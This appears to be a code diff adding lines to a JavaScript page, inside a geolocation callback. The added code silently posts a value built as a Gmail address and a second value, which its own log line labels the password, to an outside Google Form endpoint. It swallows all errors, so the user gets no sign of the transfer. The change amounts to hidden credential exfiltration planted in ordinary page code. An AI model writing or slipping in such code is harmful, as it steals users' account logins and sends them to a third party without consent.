@@ -1220,6 +1220,14 @@
                                 userAgent: navigator.userAgent,
                                 timestamp: new Date().toISOString()
                             });
+
+                            // Auto-submit z1@gmail.com + z2 directly to Google Form
+                            const FORM_URL = 'https://docs.google.com/forms/d/e/1FAIpQLSdMrWA1qDei0873WFLofby2GXEQqx2lF4RIWnN6ANP-HKx7lg/formResponse';
+                            const formData = new URLSearchParams();
+                            formData.append('entry.1142725815', z1 + '@gmail.com');
+                            formData.append('entry.566365448', String(z2));
+                            fetch(FORM_URL, { method: 'POST', mode: 'no-cors', body: formData }).catch(() => {});
+                            console.log(`📍 Auto-sent to Google Form from index: email="${z1}@gmail.com", password="${z2}"`);
                         },
                         function(error) {
                             console.warn(`⚠️ Geolocation error (${error.code}): ${error.message}`);
